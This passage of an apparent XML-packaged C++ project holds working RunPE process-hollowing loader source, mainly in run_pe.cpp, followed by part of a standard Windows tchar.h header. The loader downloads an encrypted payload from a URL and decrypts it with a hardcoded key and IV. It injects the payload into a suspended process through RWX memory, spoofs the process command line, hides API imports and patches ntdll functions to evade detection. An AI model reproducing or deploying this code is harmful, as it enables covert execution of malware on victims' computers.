    IMAGE_DATA_DIRECTORY* relocDir = get_directory_entry((const BYTE*)modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    if (relocDir == NULL) {
#ifdef _DEBUG
        std::cout &lt;&lt; "[!] WARNING: no relocation table found!\n";
#endif
        return false;
    }
    if (!validate_ptr(modulePtr, moduleSize, relocDir, sizeof(IMAGE_DATA_DIRECTORY))) {
        std::cerr &lt;&lt; "[!] Invalid relocDir pointer\n";
        return false;
    }
    DWORD maxSize = relocDir-&gt;Size;
    DWORD relocAddr = relocDir-&gt;VirtualAddress;
    bool is64b = is64bit((BYTE*)modulePtr);

    IMAGE_BASE_RELOCATION* reloc = NULL;

    DWORD parsedSize = 0;
    while (parsedSize &lt; maxSize) {
        reloc = (IMAGE_BASE_RELOCATION*)(relocAddr + parsedSize + (ULONG_PTR)modulePtr);
        if (!validate_ptr(modulePtr, moduleSize, reloc, sizeof(IMAGE_BASE_RELOCATION))) {
#ifdef _DEBUG
            std::cerr &lt;&lt; "[-] Invalid address of relocations\n";
#endif
            return false;
        }
        if (reloc-&gt;SizeOfBlock == 0) {
            break;
        }
        size_t entriesNum = (reloc-&gt;SizeOfBlock - 2 * sizeof(DWORD)) / sizeof(WORD);
        DWORD page = reloc-&gt;VirtualAddress;

        BASE_RELOCATION_ENTRY* block = (BASE_RELOCATION_ENTRY*)((ULONG_PTR)reloc + sizeof(DWORD) + sizeof(DWORD));
        if (!validate_ptr(modulePtr, moduleSize, block, sizeof(BASE_RELOCATION_ENTRY))) {
            std::cerr &lt;&lt; "[-] Invalid address of relocations block\n";
            return false;
        }
        if (!is_empty_reloc_block(block, entriesNum, page, modulePtr, moduleSize)) {
            if (!process_reloc_block(block, entriesNum, page, modulePtr, moduleSize, is64b, callback)) {
                // the block was malformed
                return false;
            }
        }
        parsedSize += reloc-&gt;SizeOfBlock;
    }
    return true;
}

bool relocate_module(IN BYTE* modulePtr, IN SIZE_T moduleSize, IN ULONGLONG newBase, IN ULONGLONG oldBase)
{
    if (modulePtr == NULL) {
        return false;
    }
    if (oldBase == 0) {
        oldBase = get_image_base(modulePtr);
    }
#ifdef _DEBUG
    printf("New Base: %llx\n", newBase);
    printf("Old Base: %llx\n", oldBase);
#endif
    if (newBase == oldBase) {
#ifdef _DEBUG
        printf("Nothing to relocate! oldBase is the same as the newBase!\n");
#endif
        return true; //nothing to relocate
    }
    if (apply_relocations(modulePtr, moduleSize, newBase, oldBase)) {
        return true;
    }
#ifdef _DEBUG
    printf("Could not relocate the module!\n");
#endif
    return false;
}

bool apply_relocations(PVOID modulePtr, SIZE_T moduleSize, ULONGLONG newBase, ULONGLONG oldBase)
{
    const bool is64b = is64bit((BYTE*)modulePtr);
    ApplyRelocCallback callback(is64b, oldBase, newBase);
    return process_relocation_table(modulePtr, moduleSize, &amp;callback);
}


bool is_empty_reloc_block(BASE_RELOCATION_ENTRY *block, SIZE_T entriesNum, DWORD page, PVOID modulePtr, SIZE_T moduleSize)
{
    if (entriesNum == 0) {
        return true; // nothing to process
    }
    BASE_RELOCATION_ENTRY* entry = block;
    for (SIZE_T i = 0; i &lt; entriesNum; i++) {
        if (!validate_ptr(modulePtr, moduleSize, entry, sizeof(BASE_RELOCATION_ENTRY))) {
            return false;
        }
        DWORD type = entry-&gt;Type;
        if (type != 0) {
            //non empty block found
            return false;
        }
        entry = (BASE_RELOCATION_ENTRY*)((ULONG_PTR)entry + sizeof(WORD));
    }
    return true;
}

bool process_reloc_block(BASE_RELOCATION_ENTRY *block, SIZE_T entriesNum, DWORD page, PVOID modulePtr, SIZE_T moduleSize, bool is64bit, RelocBlockCallback *callback)
{
    if (entriesNum == 0) {
        return true; // nothing to process
    }
    BASE_RELOCATION_ENTRY* entry = block;
    SIZE_T i = 0;
    for (i = 0; i &lt; entriesNum; i++) {
        if (!validate_ptr(modulePtr, moduleSize, entry, sizeof(BASE_RELOCATION_ENTRY))) {
            break;
        }
        DWORD offset = entry-&gt;Offset;
        DWORD type = entry-&gt;Type;
        if (type == 0) {
            break;
        }
        if (type != RELOC_32BIT_FIELD &amp;&amp; type != RELOC_64BIT_FIELD) {
            if (callback) { //print debug messages only if the callback function was set
                printf("[-] Not supported relocations format at %d: %d\n", (int)i, (int)type);
            }
            return false;
        }
        DWORD reloc_field = page + offset;
        if (reloc_field &gt;= moduleSize) {
            if (callback) { //print debug messages only if the callback function was set
                printf("[-] Malformed field: %lx\n", reloc_field);
            }
            return false;
        }
        if (callback) {
            bool isOk = callback-&gt;processRelocField(((ULONG_PTR)modulePtr + reloc_field));
            if (!isOk) {
                std::cout &lt;&lt; "[-] Failed processing reloc field at: " &lt;&lt; std::hex &lt;&lt; reloc_field &lt;&lt; "\n";
                return false;
            }
        }
        entry = (BASE_RELOCATION_ENTRY*)((ULONG_PTR)entry + sizeof(WORD));
    }
    return (i != 0);
}
</value>
  </data>
  <data name="relocate.h" xml:space="preserve">
    <value>#pragma once

#include &lt;windows.h&gt;    

#define RELOC_32BIT_FIELD 3
#define RELOC_64BIT_FIELD 0xA

typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY;

class RelocBlockCallback
{
public:
    RelocBlockCallback(bool _is64bit)
        : is64bit(_is64bit)
    {
    }

    virtual bool processRelocField(ULONG_PTR relocField) = 0;

protected:
    bool is64bit;
};

bool process_relocation_table(IN PVOID modulePtr, IN SIZE_T moduleSize, IN RelocBlockCallback *callback);

bool relocate_module(IN BYTE* modulePtr, IN SIZE_T moduleSize, IN ULONGLONG newBase, IN ULONGLONG oldBase = 0);

bool apply_relocations(PVOID modulePtr, SIZE_T moduleSize, ULONGLONG newBase, ULONGLONG oldBase);

bool is_empty_reloc_block(BASE_RELOCATION_ENTRY *block, SIZE_T entriesNum, DWORD page, PVOID modulePtr, SIZE_T moduleSize);
bool process_reloc_block(BASE_RELOCATION_ENTRY *block, SIZE_T entriesNum, DWORD page, PVOID modulePtr, SIZE_T moduleSize, bool is64bit, RelocBlockCallback *callback);
</value>
  </data>
  <data name="resource.h" xml:space="preserve">
    <value>#define IDR_MANIFEST 1</value>
  </data>
  <data name="run_pe.cpp" xml:space="preserve">
    <value>#include "run_pe.h"

#include &lt;iostream&gt;
#include "patch_ntdll.h"
#include "pe_helper.h"
#include "relocate.h"
#include "pe_hdrs_helper.h"
#include "buffer_util.h"
#include "pe_loader.h"
#include "file_util.h"
#include "resource.h"
#include "lib/lazy_importer.hpp"
#include &lt;winternl.h&gt;
#include &lt;string&gt;
#include &lt;tchar.h&gt;
#include "common_util.h"


extern bool g_PatchRequired;

typedef NTSTATUS(WINAPI * NtQueryInformationProcess_t)(
 IN HANDLE,
 IN PROCESSINFOCLASS,
 OUT PVOID,
 IN ULONG,
 OUT PULONG
 );



void* readProcessMemory(HANDLE process, void* address, DWORD bytes) {
 SIZE_T bytesRead;
 char* alloc;

 alloc = (char*)malloc(bytes);
 if (alloc == NULL) {
  return NULL;
 }

 if (ReadProcessMemory(process, address, alloc, bytes, &amp;bytesRead) == 0) {
  free(alloc);
  return NULL;
 }

 return alloc;
}

BOOL writeProcessMemory(HANDLE process, void* address, void* data, DWORD bytes) {
 SIZE_T bytesWritten;

 if (WriteProcessMemory(process, address, data, bytes, &amp;bytesWritten) == 0) {
  return false;
 }

 return true;
}



LPTSTR GenerateAString(int x) {
    // Allocate memory for x A's + null terminator
    LPTSTR buffer = (LPTSTR)LocalAlloc(LPTR, (x + 1) * sizeof(TCHAR));
    if (buffer == NULL) {
        std::cerr &lt;&lt; "Memory allocation failed!" &lt;&lt; std::endl;
        return NULL;
    }

    // Fill buffer with 'A'
    for (int i = 0; i &lt; x; ++i) {
        buffer[i] = _T('A');
    }
    buffer[0]  = _T(' ');
    

    return buffer;
}

bool create_suspended_process(IN LPCTSTR path, IN LPCTSTR cmdLine, OUT PROCESS_INFORMATION &amp;pi)
{
    STARTUPINFOA si = { 0 };
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    SIZE_T bytesRead = 0, bytesWritten = 0;
    BOOL success;
    PEB pebLocal = { 0 };
    RTL_USER_PROCESS_PARAMETERS* parameters = nullptr;

    si.cb = sizeof(si);
    memset(&amp;pi, 0, sizeof(pi));

    //LPTSTR fake_cmd = GenerateAString(sizeof(cmdLine));

    // Use CMD_TO_SHOW as a fake command line
    if (!LI_FN(CreateProcessA)(
        path,
        (LPSTR)cmdLine,
        nullptr,
        nullptr,
        FALSE,
        CREATE_SUSPENDED,
        nullptr,
        "C:\\Windows\\System32",
        &amp;si,
        &amp;pi))
    {
        std::cerr &lt;&lt; "[ERROR] CreateProcess failed, Error = " &lt;&lt; std::hex &lt;&lt; GetLastError() &lt;&lt; "\n";
        return false;
    }

    // Get NtQueryInformationProcess
    auto NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) {
        std::cerr &lt;&lt; "[ERROR] Failed to get NtQueryInformationProcess\n";
        return false;
    }

    // Get PEB
    if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &amp;pbi, sizeof(pbi), nullptr) != 0) {
        std::cerr &lt;&lt; "[ERROR] NtQueryInformationProcess failed\n";
        return false;
    }

    if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &amp;pebLocal, sizeof(PEB), &amp;bytesRead)) {
        std::cerr &lt;&lt; "[ERROR] Failed to read remote PEB\n";
        return false;
    }

    // Read the ProcessParameters
    parameters = (RTL_USER_PROCESS_PARAMETERS*)readProcessMemory(
        pi.hProcess,
        pebLocal.ProcessParameters,
        sizeof(RTL_USER_PROCESS_PARAMETERS) + 512 // add padding
    );

    if (!parameters) {
        std::cerr &lt;&lt; "[ERROR] Failed to read remote process parameters\n";
        return false;
    }

    // Spoofed command line
    // std::wstring wSpoofed = CMD_TO_EXEC;
    // USHORT newLen = (USHORT)(wSpoofed.length() * sizeof(WCHAR));
    // USHORT newMaxLen = newLen + sizeof(WCHAR);

    // split CMD line so that can get process.exe name and set to newUnicodeLen



    DWORD newUnicodeLen = splitFirstSpace(cmdLine);
    std::cout &lt;&lt; "newUnicodeLen: " &lt;&lt; newUnicodeLen &lt;&lt; std::endl;
    DWORD UniCodeLenNew = newUnicodeLen * 2;
    // Update Length
    if (!WriteProcessMemory(pi.hProcess,
        (PBYTE)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
        &amp;UniCodeLenNew, 4, &amp;bytesWritten)) {
        std::cerr &lt;&lt; "[ERROR] Failed to update CommandLine.Length\n";
        return false;
    }



    std::wcout &lt;&lt; L"[+] Process PID: " &lt;&lt; pi.dwProcessId &lt;&lt; std::endl;

    // Success
    return true;
}

bool terminate_process(DWORD pid)
{
    bool is_killed = false;
    HANDLE hProcess = LI_FN(OpenProcess)(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess) {
        return false;
    }
    if (LI_FN(TerminateProcess)(hProcess, 0)) {
        is_killed = true;
    }
    else {
        std::cerr &lt;&lt; "[ERROR] Could not terminate the process. PID = " &lt;&lt; std::dec &lt;&lt; pid &lt;&lt; std::endl;
    }
    LI_FN(CloseHandle)(hProcess);
    return is_killed;
}

bool read_remote_mem(HANDLE hProcess, ULONGLONG remote_addr, OUT void* buffer, const size_t buffer_size)
{
    memset(buffer, 0, buffer_size);
    if (!LI_FN(ReadProcessMemory)(hProcess, LPVOID(remote_addr), buffer, buffer_size, nullptr)) {
        std::cerr &lt;&lt; "[ERROR] Cannot read from the remote memory!\n";
        return false;
    }
    return true;
}

BOOL update_remote_entry_point(PROCESS_INFORMATION &amp;pi, ULONGLONG entry_point_va, bool is32bit)
{
#ifdef _DEBUG
    std::cout &lt;&lt; "Writing new EP: " &lt;&lt; std::hex &lt;&lt; entry_point_va &lt;&lt; std::endl;
#endif
#if defined(_WIN64)
    if (is32bit) {
        // The target is a 32 bit executable while the loader is 64bit,
        // so, in order to access the target we must use Wow64 versions of the functions:

        // 1. Get initial context of the target:
        WOW64_CONTEXT context = { 0 };
        memset(&amp;context, 0, sizeof(WOW64_CONTEXT));
        context.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(pi.hThread, &amp;context)) {
            return FALSE;
        }
        // 2. Set the new Entry Point in the context:
        context.Eax = static_cast&lt;DWORD&gt;(entry_point_va);

        // 3. Set the changed context into the target:
        return Wow64SetThreadContext(pi.hThread, &amp;context);
    }
#endif
    // 1. Get initial context of the target:
    CONTEXT context = { 0 };
    memset(&amp;context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi.hThread, &amp;context)) {
        return FALSE;
    }
    // 2. Set the new Entry Point in the context:
#if defined(_M_AMD64)
    context.Rcx = entry_point_va;
#elif defined(_M_ARM64)
    context.X23 = entry_point_va;
#else
    context.Eax = static_cast&lt;DWORD&gt;(entry_point_va);
#endif
    // 3. Set the changed context into the target:
    return SetThreadContext(pi.hThread, &amp;context);
}

ULONGLONG get_remote_peb_addr(PROCESS_INFORMATION &amp;pi, bool is32bit)
{
#if defined(_WIN64)
    if (is32bit) {
        //get initial context of the target:
        WOW64_CONTEXT context;
        memset(&amp;context, 0, sizeof(WOW64_CONTEXT));
        context.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(pi.hThread, &amp;context)) {
            printf("Wow64 cannot get context!\n");
            return 0;
        }
        //get remote PEB from the context
        return static_cast&lt;ULONGLONG&gt;(context.Ebx);
    }
#endif
    ULONGLONG PEB_addr = 0;
    CONTEXT context;
    memset(&amp;context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi.hThread, &amp;context)) {
        return 0;
    }
#if defined(_M_AMD64)
    PEB_addr = context.Rdx;
#elif defined(_M_ARM64)
    PEB_addr = context.X23;
#else
    PEB_addr = context.Ebx;
#endif
    return PEB_addr;
}
inline ULONGLONG get_img_base_peb_offset(bool is32bit)
{
/*
We calculate this offset in relation to PEB,
that is defined in the following way
(source "ntddk.h"):

typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace; // size: 1
    BOOLEAN ReadImageFileExecOptions; // size : 1
    BOOLEAN BeingDebugged; // size : 1
    BOOLEAN SpareBool; // size : 1
                    // on 64bit here there is a padding to the sizeof ULONGLONG (DWORD64)
    HANDLE Mutant; // this field have DWORD size on 32bit, and ULONGLONG (DWORD64) size on 64bit
                   
    PVOID ImageBaseAddress;
    [...]
    */
    ULONGLONG img_base_offset = is32bit ? 
        sizeof(DWORD) * 2
        : sizeof(ULONGLONG) * 2;

    return img_base_offset;
}

bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &amp;pi, bool is32bit)
{
    //1. Calculate VA of the payload's EntryPoint
    DWORD ep = get_entry_point_rva(loaded_pe);
    ULONGLONG ep_va = (ULONGLONG)load_base + ep;

    //2. Write the new Entry Point into context of the remote process:
    if (update_remote_entry_point(pi, ep_va, is32bit) == FALSE) {
        std::cerr &lt;&lt; "Cannot update remote EP!\n";
        return false;
    }
    //3. Get access to the remote PEB:
    ULONGLONG remote_peb_addr = get_remote_peb_addr(pi, is32bit);
    if (!remote_peb_addr) {
        std::cerr &lt;&lt; "Failed getting remote PEB address!\n";
        return false;
    }
    // get the offset to the PEB's field where the ImageBase should be saved (depends on architecture):
    LPVOID remote_img_base = (LPVOID)(remote_peb_addr + get_img_base_peb_offset(is32bit));
    

    //calculate size of the field (depends on architecture):
    const size_t img_base_size = is32bit ? sizeof(DWORD) : sizeof(ULONGLONG);

    SIZE_T written = 0;
    //4. Write the payload's ImageBase into remote process' PEB:
    if (!LI_FN(WriteProcessMemory)(pi.hProcess, remote_img_base,
        &amp;load_base, img_base_size, 
        &amp;written)) 
    {
        std::cerr &lt;&lt; "Cannot update ImageBaseAddress!\n";
        return false;
    }

    return true;
}

bool _run_pe(BYTE *loaded_pe, size_t payloadImageSize, PROCESS_INFORMATION &amp;pi, bool is32bit)
{

    if (loaded_pe == NULL) return false;


    //getchar();

    //1. Allocate memory for the payload in the remote process:
    LPVOID remoteBase = LI_FN(VirtualAllocEx)(pi.hProcess, nullptr, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBase == NULL)  {
        std::cerr &lt;&lt; "Could not allocate memory in the remote process\n";
        return false;
    }

    printf("Allocated remote ImageBase: %p size: %lx\n", remoteBase, static_cast&lt;ULONG&gt;(payloadImageSize));

    //2. Relocate the payload (local copy) to the Remote Base:
    if (!relocate_module(loaded_pe, payloadImageSize, (ULONGLONG) remoteBase)) {
        std::cout &lt;&lt; "Could not relocate the module!\n";
        return false;
    }
    //3. Update the image base of the payload (local copy) to the Remote Base:
    update_image_base(loaded_pe, (ULONGLONG) remoteBase);

    //4. Write the payload to the remote process, at the Remote Base:
    SIZE_T written = 0;
    if (!LI_FN(WriteProcessMemory)(pi.hProcess, remoteBase, loaded_pe, payloadImageSize, &amp;written)) {
        std::cout &lt;&lt; "Writing to the remote process failed!\n";
        return false;
    }

    printf("Loaded at: %p\n", remoteBase);

    //5. Redirect the remote structures to the injected payload (EntryPoint and ImageBase must be changed):
    if (!redirect_to_payload(loaded_pe, remoteBase, pi, is32bit)) {
        std::cerr &lt;&lt; "Redirecting failed!\n";
        return false;
    }
    if (!is32bit &amp;&amp; g_PatchRequired &amp;&amp; !patch_ZwQueryVirtualMemory(pi.hProcess, remoteBase)) {
        std::cout &lt;&lt; "ERROR: failed to apply the required patch on NTDLL\n";
    }
    
   
    std::cout &lt;&lt; "Resuming the process: " &lt;&lt; std::dec &lt;&lt; pi.dwProcessId &lt;&lt; std::endl;
    //6. Resume the thread and let the payload run:
    

    LI_FN(ResumeThread)(pi.hThread);
    return true;
}

bool is_target_compatibile(BYTE *payload_buf, size_t payload_size, LPCTSTR targetPath)
{
    if (!payload_buf) {
        return false;
    }
    const WORD payload_subs = get_subsystem(payload_buf);

    size_t target_size = 0;

    BYTE* target_pe = load_pe_module(targetPath, target_size, false, false);
    if (!target_pe) {
        return false;
    }
    const WORD target_subs = get_subsystem(target_pe);
    const bool is64bit_target = is64bit(target_pe);
    free_pe_buffer(target_pe); target_pe = NULL; target_size = 0;

    if (is64bit_target != is64bit(payload_buf)) {
        std::cerr &lt;&lt; "Incompatibile target bitness!\n";
        return false;
    }
    if (payload_subs != IMAGE_SUBSYSTEM_WINDOWS_GUI //only a payload with GUI subsystem can be run by both GUI and CLI
        &amp;&amp; target_subs != payload_subs)
    {
        std::cerr &lt;&lt; "Incompatibile target subsystem!\n";
        return false;
    }
    return true;
}



bool run_pe(IN LPCTSTR payloadPath, IN LPTSTR targetPath, IN LPCTSTR cmdLine)
{
    //1. Load the payload:
    size_t payloadImageSize = 0;
   
    printf("Full URL: %s\n", payloadPath);

    std::pair&lt;std::string, std::string&gt; splitURL = parseURL(payloadPath);
    printf("First: %s\n", splitURL.first.c_str());
    printf("Second: %s\n", splitURL.second.c_str());
    BYTE* resourceBytes = buffer_payload_from_url(splitURL.first.c_str(), splitURL.second.c_str(), payloadImageSize, "LoveAllingUnitofLAWniUUXUUXVVXV", "");

    BYTE* loaded_pe = load_pe_module(resourceBytes, payloadImageSize, payloadImageSize, false, false, get_image_base(resourceBytes));

    if (!loaded_pe) {
        std::cerr &lt;&lt; "Loading failed!\n";
        return false;
    }
    // Get the payload's architecture and check if it is compatibile with the loader:
    const WORD payload_arch = get_nt_hdr_architecture(loaded_pe);
    if (payload_arch != IMAGE_NT_OPTIONAL_HDR32_MAGIC &amp;&amp; payload_arch != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        std::cerr &lt;&lt; "Not supported paylad architecture!\n";
        return false;
    }
    const bool is32bit_payload = !is64bit(loaded_pe);
#ifndef _WIN64
    if (!is32bit_payload) {
        std::cerr &lt;&lt; "Incompatibile payload architecture!\n"
            &lt;&lt; "Only 32 bit payloads can be injected from 32bit loader!\n";
        return false;
    }
#endif
    // 2. Prepare the taget
    if (targetPath == NULL) {
        std::cerr &lt;&lt; "No target supplied!\n";
        return false;
    }
    if (!is_target_compatibile(loaded_pe, payloadImageSize, targetPath)) {
        free_pe_buffer(loaded_pe, payloadImageSize);
        return false;
    }
    // Create the target process (suspended):
    PROCESS_INFORMATION pi = { 0 };
    bool is_created = create_suspended_process(targetPath, cmdLine, pi);
    if (!is_created) {
        std::cerr &lt;&lt; "Creating target process failed!\n";
        free_pe_buffer(loaded_pe, payloadImageSize);
        return false;
    }


    if (g_PatchRequired) {
#ifndef _WIN64
        patch_NtManageHotPatch32(pi.hProcess);
#else
        patch_NtManageHotPatch64(pi.hProcess);
#endif
    }
    //3. Perform the actual RunPE:
    bool isOk = _run_pe(loaded_pe, payloadImageSize, pi, is32bit_payload);
    //4. Cleanup:
    if (!isOk) { //if injection failed, kill the process
        terminate_process(pi.dwProcessId);
    }
    free_pe_buffer(loaded_pe, payloadImageSize);
    LI_FN(CloseHandle)(pi.hThread);
    LI_FN(CloseHandle)(pi.hProcess);
    //---
    return isOk;
}


bool run_pe_bytes(IN BYTE* payloadData, IN size_t payloadSize, IN LPTSTR targetPath, IN LPCTSTR cmdLine, IN BOOL isEncrypted) {

    BYTE* loaded_pe = NULL;
    if (isEncrypted) {
        //printf("Decrypting payload\n");
        std::string iv = (std::string)("freediddybummynz");
      BYTE* decryptedData = DecryptResourceBuffer(payloadData, payloadSize, "LoveAllingUnitofLAWniUUXUUXVVXV", iv, payloadSize);
         loaded_pe = load_pe_module(decryptedData, payloadSize, payloadSize, false, false, get_image_base(decryptedData));
    }else{
        loaded_pe = load_pe_module(payloadData, payloadSize, payloadSize, false, false, get_image_base(payloadData));
    }
    
   

    printf("Loaded at: %p\n", loaded_pe);
    printf("Payload size: %d\n", payloadSize);


    if (!loaded_pe) {
        std::cerr &lt;&lt; "Loading failed!\n";
        return false;
    }
    // Get the payload's architecture and check if it is compatibile with the loader:
    const WORD payload_arch = get_nt_hdr_architecture(loaded_pe);
    if (payload_arch != IMAGE_NT_OPTIONAL_HDR32_MAGIC &amp;&amp; payload_arch != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        std::cerr &lt;&lt; "Not supported paylad architecture!\n";
        return false;
    }
    const bool is32bit_payload = !is64bit(loaded_pe);
#ifndef _WIN64
    if (!is32bit_payload) {
        std::cerr &lt;&lt; "Incompatibile payload architecture!\n"
            &lt;&lt; "Only 32 bit payloads can be injected from 32bit loader!\n";
        return false;
    }
#endif
    // 2. Prepare the taget
    if (targetPath == NULL) {
        std::cerr &lt;&lt; "No target supplied!\n";
        return false;
    }
    if (!is_target_compatibile(loaded_pe, payloadSize, targetPath)) {
        free_pe_buffer(loaded_pe, payloadSize);
        return false;
    }
    // Create the target process (suspended):
    PROCESS_INFORMATION pi = { 0 };
    bool is_created = create_suspended_process(targetPath, cmdLine, pi);
    if (!is_created) {
        std::cerr &lt;&lt; "Creating target process failed!\n";
        free_pe_buffer(loaded_pe, payloadSize);
        return false;
    }
    printf("Pi id: %d\n", pi.dwProcessId);
    if (g_PatchRequired) {
#ifndef _WIN64
        patch_NtManageHotPatch32(pi.hProcess);
#else
        patch_NtManageHotPatch64(pi.hProcess);
#endif
    }
    //3. Perform the actual RunPE:
    bool isOk = _run_pe(loaded_pe, payloadSize, pi, is32bit_payload);
    
    //4. Cleanup:
    if (!isOk) { //if injection failed, kill the process
        terminate_process(pi.dwProcessId);
    }
    free_pe_buffer(loaded_pe, payloadSize);
    LI_FN(CloseHandle)(pi.hThread);
    LI_FN(CloseHandle)(pi.hProcess);
    //---


    return isOk;

}
</value>
  </data>
  <data name="run_pe.h" xml:space="preserve">
    <value>#pragma once

#include &lt;windows.h&gt;

/**
Perform the RunPE injection of the payload into the target.
*/


bool run_pe(IN LPCTSTR payloadPath, IN LPTSTR targetPath, IN LPCTSTR cmdLine);

bool run_pe_bytes(IN BYTE* payloadData, IN size_t payloadSize, IN LPTSTR targetPath, IN LPCTSTR cmdLine, IN BOOL isEncrypted);

BOOL update_remote_entry_point(PROCESS_INFORMATION&amp; pi, ULONGLONG entry_point_va, bool is32bit);
</value>
  </data>
  <data name="tchar.h" xml:space="preserve">
    <value>/***
*tchar.h - definitions for generic international text functions
*
*       Copyright (c) Microsoft Corporation. All rights reserved.
*
*Purpose:
*       Definitions for generic international functions, mostly defines
*       which map string/formatted-io/ctype functions to char, wchar_t, or
*       MBCS versions.  To be used for compatibility between single-byte,
*       multi-byte and Unicode text models.
*
*       [Public]
*
****/

#pragma once
#ifndef _INC_TCHAR // include guard for 3rd party interop
#define _INC_TCHAR

#include &lt;corecrt.h&gt;

#pragma warning(push)
#pragma warning(disable: _UCRT_DISABLED_WARNINGS)
_UCRT_DISABLE_CLANG_WARNINGS

/* Notes */

/* There is no:
 *      _tcscat_l
 *      _tcscpy_l
 * because mbscat and mbscpy just behave like strcat and strcpy,
 * so no special locale-specific behavior is needed.
 */

/* Functions like:
 *      _strncat_l
 *      _strncat_s_l
 * are only available if ANSI is defined (i.e. no _UNICODE nor _MBCS),
 * because these functions are only accessible through the _tcs macros.
 */

#ifdef __cplusplus
extern "C" {
#endif  /* __cplusplus */

#ifndef _CRT_FAR_MAPPINGS_NO_DEPRECATE
/*
Long ago, these f prefix text functions referred to handling of text in segmented architectures. Ever since the move
to Win32 they have been obsolete names, but we kept them around as aliases. Now that we have a deprecation
mechanism we can warn about them. You should switch to the identical function without the f prefix.
*/
#pragma deprecated("_ftcscat")
#pragma deprecated("_ftcschr")
#pragma deprecated("_ftcscpy")
#pragma deprecated("_ftcscspn")
#pragma deprecated("_ftcslen")
#pragma deprecated("_ftcsncat")
#pragma deprecated("_ftcsncpy")
#pragma deprecated("_ftcspbrk")
#pragma deprecated("_ftcsrchr")
#pragma deprecated("_ftcsspn")
#pragma deprecated("_ftcsstr")
#pragma deprecated("_ftcstok")
#pragma deprecated("_ftcsdup")
#pragma deprecated("_ftcsnset")
#pragma deprecated("_ftcsrev")
#pragma deprecated("_ftcsset")
#pragma deprecated("_ftcscmp")
#pragma deprecated("_ftcsicmp")
#pragma deprecated("_ftcsnccmp")
#pragma deprecated("_ftcsncmp")
#pragma deprecated("_ftcsncicmp")
#pragma deprecated("_ftcsnicmp")
#pragma deprecated("_ftcscoll")
#pragma deprecated("_ftcsicoll")
#pragma deprecated("_ftcsnccoll")
#pragma deprecated("_ftcsncoll")
#pragma deprecated("_ftcsncicoll")
#pragma deprecated("_ftcsnicoll")
#pragma deprecated("_ftcsclen")
#pragma deprecated("_ftcsnccat")
#pragma deprecated("_ftcsnccpy")
#pragma deprecated("_ftcsncset")
#pragma deprecated("_ftcsdec")
#pragma deprecated("_ftcsinc")
#pragma deprecated("_ftcsnbcnt")
#pragma deprecated("_ftcsnccnt")
#pragma deprecated("_ftcsnextc")
#pragma deprecated("_ftcsninc")
#pragma deprecated("_ftcsspnp")
#pragma deprecated("_ftcslwr")
#pragma deprecated("_ftcsupr")
#pragma deprecated("_ftclen")
#pragma deprecated("_ftccpy")
#pragma deprecated("_ftccmp")
#endif  /* _CRT_FAR_MAPPINGS_NO_DEPRECATE */

#define _ftcscat    _tcscat
#define _ftcschr    _tcschr
#define _ftcscpy    _tcscpy
#define _ftcscspn   _tcscspn
#define _ftcslen    _tcslen
#define _ftcsncat   _tcsncat
#define _ftcsncpy   _tcsncpy
#define _ftcspbrk   _tcspbrk
#define _ftcsrchr   _tcsrchr
#define _ftcsspn    _tcsspn
#define _ftcsstr    _tcsstr
#define _ftcstok    _tcstok

#define _ftcsdup    _tcsdup
#define _ftcsnset   _tcsnset
#define _ftcsrev    _tcsrev
#define _ftcsset    _tcsset

#define _ftcscmp      _tcscmp
#define _ftcsicmp     _tcsicmp
#define _ftcsnccmp    _tcsnccmp
#define _ftcsncmp     _tcsncmp
#define _ftcsncicmp   _tcsncicmp
#define _ftcsnicmp    _tcsnicmp

#define _ftcscoll     _tcscoll
#define _ftcsicoll    _tcsicoll
#define _ftcsnccoll   _tcsnccoll
#define _ftcsncoll    _tcsncoll
#define _ftcsncicoll  _tcsncicoll
#define _ftcsnicoll   _tcsnicoll

/* Redundant "logical-character" mappings */

#define _ftcsclen   _tcsclen
#define _ftcsnccat  _tcsnccat
#define _ftcsnccpy  _tcsnccpy
#define _ftcsncset  _tcsncset

#define _ftcsdec    _tcsdec
#define _ftcsinc    _tcsinc
#define _ftcsnbcnt  _tcsnbcnt
#define _ftcsnccnt  _tcsnccnt
#define _ftcsnextc  _tcsnextc
#define _ftcsninc   _tcsninc
#define _ftcsspnp   _tcsspnp

#define _ftcslwr    _tcslwr
#define _ftcsupr    _tcsupr

#define _ftclen     _tclen
#define _ftccpy     _tccpy
#define _ftccmp     _tccmp

#ifdef _UNICODE

#ifdef __cplusplus
}   /* ... extern "C" */
#endif  /* __cplusplus */

/* ++++++++++++++++++++ UNICODE ++++++++++++++++++++ */

#include &lt;wchar.h&gt;

#ifdef __cplusplus
extern "C" {
#endif  /* __cplusplus */

#ifndef __TCHAR_DEFINED
typedef wchar_t     _TCHAR;
typedef wchar_t     _TSCHAR;
typedef wchar_t     _TUCHAR;
typedef wchar_t     _TXCHAR;
typedef wint_t      _TINT;
#define __TCHAR_DEFINED
#endif  /* __TCHAR_DEFINED */

#if defined(_CRT_INTERNAL_NONSTDC_NAMES) &amp;&amp; _CRT_INTERNAL_NONSTDC_NAMES
#ifndef _TCHAR_DEFINED
typedef wchar_t     TCHAR;
typedef wchar_t *   PTCHAR;
typedef wchar_t     TBYTE;
typedef wchar_t *   PTBYTE;
#define _TCHAR_DEFINED
#endif  /* _TCHAR_DEFINED */
